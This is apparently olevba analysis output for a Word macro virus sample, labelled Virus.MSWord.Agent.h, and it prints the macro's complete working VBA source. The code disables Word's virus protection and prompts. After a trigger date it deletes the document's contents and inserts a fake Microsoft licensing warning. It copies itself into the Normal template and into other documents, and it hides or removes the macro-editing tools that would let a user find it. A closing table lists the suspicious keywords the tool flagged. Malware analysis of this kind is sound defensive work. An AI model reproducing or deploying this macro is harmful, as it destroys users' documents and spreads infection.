olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agent.h-3b71be25dedc79b44607136d634b19fa63259da1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agent.h-3b71be25dedc79b44607136d634b19fa63259da1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








































































Private Sub Document_Close()
On Error Resume Next
    Dim myDate As Date
    myDate=#24.12.00#
    Dim SaveDOC, SaveDOT, DI, NI As Boolean
    Dim ad, nt As Object
    Dim rixCode As String
    Const mmX = "M-M-x"
'Tarlac State University Sucks
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    DI = ad.CodeModule.Find(mmX, 1, 1, 10000, 10000)
    NI = nt.CodeModule.Find(mmX, 1, 1, 10000, 10000)
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
        If Date >= myDate Then
            With Selection
                .WholeStory
                .Delete Unit:=wdCharacter, Count:=1
                .TypeText Text:="Sorry, Microsoft has determined that this copy of MS Word is not licensed!"
                .TypeParagraph
                .TypeText Text:="It is illegal to use this product. You have been warned!!!!!"
                .TypeParagraph
                .TypeText Text:="Please use/buy an original licensed copy of this product. Thank you"
            End With
            ActiveDocument.Save
        End If
'AMA CLC Tarlac Sucks
'*********************************
    If (DI = True Xor NI = True) And _
       (ActiveDocument.SaveFormat = wdFormatDocument Or _
       ActiveDocument.SaveFormat = wdFormatTemplate) Then
'DOT
      If DI = True Then
        SaveDOT = NormalTemplate.Saved
        rixCode = ad.CodeModule.Lines(1, 75)
        rixCode = rixCode & vbCrLf & vbTab & "myDate=#" & makeMyDate & "#"
        rixCode = rixCode & vbCrLf & ad.CodeModule.Lines(77, ad.CodeModule.CountOfLines)
        rixCode = rixCode & vbCrLf & "' " & Format(Time, "HH.MM.SS-") & Format(Date, "mm.dd.yy")
        nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
        nt.CodeModule.AddFromString rixCode
        If SaveDOT = True Then NormalTemplate.Save
      End If
'STI Tarlac Sucks
'DOC
      If NI = True And DI = False Or ActiveDocument.Saved = False Then
        SaveDOC = ActiveDocument.Saved
        rixCode = nt.CodeModule.Lines(1, 75)
        rixCode = rixCode & vbCrLf & vbTab & "myDate=#" & makeMyDate & "#"
        rixCode = rixCode & vbCrLf & nt.CodeModule.Lines(77, nt.CodeModule.CountOfLines)
        rixCode = rixCode & vbCrLf & "' " & Format(Time, "HH.MM.SS-") & Format(Date, "mm.dd.yy")
        ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
        ad.CodeModule.AddFromString rixCode
        If SaveDOC = True Then ActiveDocument.Save
      End If
    End If
'All the rest sucks even more
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        .ConfirmConversions = False
        .SavePropertiesPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("Control Toolbox").Visible = False
    CommandBars("Control Toolbox").Enabled = False
    CommandBars("Control Toolbox").Protection = msoBarNoChangeVisible
    CommandBars("Control Toolbox").Protection = msoBarNoCustomize
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
End Sub

Private Function makeMyDate() As Date
    Dim dM, dD, dY As Integer
    Randomize
    dM = Int(Rnd() * 12) + 1
    dD = Int(Rnd() * 25) + 1
    dY = 2000
    makeMyDate = CDate(dM & "/" & dD & "/" & dY)
End Function



' 12.07.19-01.25.00


' 16.23.21-01.27.00


' 08.53.15-01.28.00


' 10.08.56-02.24.00


' 10.58.57-02.24.00


' 11.13.40-02.24.00


' 11.44.42-02.24.00


' 11.45.16-02.24.00


' 11.14.41-03.03.00


' 11.15.16-03.03.00


' 23.34.01-06.20.00


' 23.34.16-06.20.00


' 19.48.26-12.20.05


' 19.48.36-12.20.05

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

